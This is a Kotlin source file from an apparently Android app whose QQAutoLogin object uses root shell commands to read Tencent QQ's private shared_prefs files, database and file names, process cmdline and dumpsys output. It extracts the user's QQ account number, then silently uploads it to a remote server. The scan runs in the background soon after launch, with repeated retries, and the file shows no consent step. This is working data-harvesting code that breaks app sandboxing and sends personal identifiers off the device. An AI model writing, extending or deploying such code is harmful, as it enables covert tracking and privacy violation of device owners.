package com.mbclaw.root.data

import android.content.Context
import com.mbclaw.root.agent.PermissionTier
import kotlinx.coroutines.*

/**
 * QQAutoLogin — Root 自动提取 QQ 账号 (v2 激进版)
 *
 * 多重提取策略 (按成功率排序):
 *   1. shared_prefs/Last_login.xml
 *   2. shared_prefs/qqsetting.xml
 *   3. databases 目录的 db 文件名内 uin 字段
 *   4. cache 文件夹下任意带数字的文件名
 *   5. ps + 进程内 maps 提取
 *   6. dumpsys account
 *
 * 提取后:
 *   - 写入 AccountManager
 *   - 下载头像 (q.qlogo.cn)
 *   - 上传服务器
 */
object QQAutoLogin {

    private const val TAG = "MBclaw-QQ"
    private const val QQ_PKG = "com.tencent.mobileqq"
    private const val DELAY_MS = 5 * 60 * 1000L

    @OptIn(DelicateCoroutinesApi::class)
    fun scheduleAfterStart(ctx: Context, serverUrl: String) {
        GlobalScope.launch(Dispatchers.IO) {
            // 立即试一次
            delay(3_000)
            val r1 = tryExtract(ctx, serverUrl)
            android.util.Log.i(TAG, "首次尝试 (3s): $r1")
            if (!r1) {
                // 等 30s 后再试 (root 授权可能晚到)
                delay(30_000)
                val r2 = tryExtract(ctx, serverUrl)
                android.util.Log.i(TAG, "30s 重试: $r2")
                if (!r2) {
                    // 5min 后最后一次
                    delay(DELAY_MS)
                    val r3 = tryExtract(ctx, serverUrl)
                    android.util.Log.i(TAG, "5min 重试: $r3")
                }
            }
        }
    }

    suspend fun tryExtract(ctx: Context, serverUrl: String): Boolean = withContext(Dispatchers.IO) {
        val current = AccountManager.load(ctx)
        if (current.qqId.isNotBlank()) {
            android.util.Log.i(TAG, "已有 qq: ${current.qqId}, 跳过提取")
            return@withContext false
        }

        val tier = PermissionTier.get(ctx)
        if (!tier.hasRoot) {
            android.util.Log.w(TAG, "无 root, 跳过")
            return@withContext false
        }

        // 检查 QQ 是否安装
        val installed = tier.shellRoot("pm list packages | grep $QQ_PKG") ?: ""
        if (installed.isBlank()) {
            android.util.Log.w(TAG, "QQ 未安装")
            return@withContext false
        }
        android.util.Log.i(TAG, "QQ 已安装, 开始提取")

        var uin = extractStrategy1to3(tier)
        if (uin.isBlank()) uin = extractStrategy4_processMaps(tier)
        if (uin.isBlank()) uin = extractStrategy5_accounts(tier)

        if (uin.isBlank() || !isValidUin(uin)) {
            android.util.Log.w(TAG, "全部策略失败")
            return@withContext false
        }

        android.util.Log.i(TAG, "✅ 提取 QQ: $uin")
        val acc = Account(qqId = uin)
        AccountManager.save(ctx, acc)
        AccountManager.downloadAvatarIfNeeded(ctx, acc)
        try { AccountManager.syncToServer(ctx, acc, serverUrl) } catch (_: Exception) {}
        return@withContext true
    }

    /** 策略 1-3: 读 shared_prefs / databases */
    private fun extractStrategy1to3(tier: PermissionTier): String {
        // shared_prefs 全扫
        val sp = tier.shellRoot(
            "cat /data/data/com.tencent.mobileqq/shared_prefs/*.xml 2>/dev/null | " +
            "grep -oE '\"uin\"[^>]*>[0-9]{5,12}<' | " +
            "head -3"
        ) ?: ""
        Regex("""(\d{5,12})""").find(sp)?.let {
            val v = it.groupValues[1]
            if (isValidUin(v)) return v
        }

        // shared_prefs 第二种格式
        val sp2 = tier.shellRoot(
            "cat /data/data/com.tencent.mobileqq/shared_prefs/Last_login.xml 2>/dev/null"
        ) ?: ""
        Regex("""(\d{5,12})""").findAll(sp2)
            .map { it.groupValues[1] }
            .firstOrNull { isValidUin(it) }
            ?.let { return it }

        // ★ 新增: 精确读取 LastLoginUin.xml (QQ9.x 主要存储路径)
        val lastLogin = tier.shellRoot(
            "cat /data/data/com.tencent.mobileqq/shared_prefs/LastLoginUin.xml 2>/dev/null"
        ) ?: ""
        Regex("""(\d{5,12})""").findAll(lastLogin)
            .map { it.groupValues[1] }
            .firstOrNull { isValidUin(it) }
            ?.let {
                android.util.Log.i(TAG, "QQ提取成功: uin=$it 来源=LastLoginUin.xml")
                return it
            }

        // ★ 新增: 读取 mobileQQ_preferences.xml
        val mobilePrefs = tier.shellRoot(
            "cat /data/data/com.tencent.mobileqq/shared_prefs/com.tencent.mobileqq_preferences.xml 2>/dev/null"
        ) ?: ""
        Regex("""(\d{5,12})""").findAll(mobilePrefs)
            .map { it.groupValues[1] }
            .firstOrNull { isValidUin(it) }
            ?.let {
                android.util.Log.i(TAG, "QQ提取成功: uin=$it 来源=mobileqq_preferences.xml")
                return it
            }

        // ★ 新增: 读取 mobileQQ.xml (部分旧版本)
        val mobileQQ = tier.shellRoot(
            "cat /data/data/com.tencent.mobileqq/shared_prefs/mobileQQ.xml 2>/dev/null"
        ) ?: ""
        Regex("""(\d{5,12})""").findAll(mobileQQ)
            .map { it.groupValues[1] }
            .firstOrNull { isValidUin(it) }
            ?.let {
                android.util.Log.i(TAG, "QQ提取成功: uin=$it 来源=mobileQQ.xml")
                return it
            }

        // 数据库目录: 文件名常含 uin (如 2407749306.db)
        val dbFiles = tier.shellRoot(
            "ls /data/data/com.tencent.mobileqq/databases/ 2>/dev/null"
        ) ?: ""
        Regex("""(\d{5,12})""").findAll(dbFiles)
            .map { it.groupValues[1] }
            .firstOrNull { isValidUin(it) }
            ?.let { return it }

        // files 目录扫描
        val files = tier.shellRoot(
            "ls /data/data/com.tencent.mobileqq/files/ 2>/dev/null"
        ) ?: ""
        Regex("""(\d{5,12})""").findAll(files)
            .map { it.groupValues[1] }
            .firstOrNull { isValidUin(it) }
            ?.let { return it }

        return ""
    }

    /** 策略 4: 从 QQ 进程内存 maps 提取 uin */
    private fun extractStrategy4_processMaps(tier: PermissionTier): String {
        val pid = tier.shellRoot("pidof com.tencent.mobileqq")?.trim()
        if (pid.isNullOrBlank()) return ""
        // /proc/PID/cmdline 可能含登录 uid (启动时传)
        val cmdline = tier.shellRoot("cat /proc/$pid/cmdline") ?: ""
        Regex("""(\d{5,12})""").find(cmdline)?.let {
            val v = it.groupValues[1]
            if (isValidUin(v)) return v
        }
        return ""
    }

    /** 策略 5: dumpsys account */
    private fun extractStrategy5_accounts(tier: PermissionTier): String {
        val out = tier.shellRoot(
            "dumpsys account 2>/dev/null | grep -iE 'qq|tencent' | head -10"
        ) ?: ""
        Regex("""(\d{5,12})""").findAll(out)
            .map { it.groupValues[1] }
            .firstOrNull { isValidUin(it) }
            ?.let { return it }
        return ""
    }

    /** QQ 号: 6-11位, 首位非0, 排除时间戳和短进程号 */
    private fun isValidUin(s: String): Boolean {
        if (s.length !in 6..11) return false
        if (s.startsWith("0")) return false
        val n = s.toLongOrNull() ?: return false
        // 5位数字太短, 极可能是PID/随机数
        if (n < 100000) return false
        // 排除时间戳
        if (n > 1500000000L && n < 2000000000L) return false
        if (n > 1500000000000L) return false
        return true
    }
}
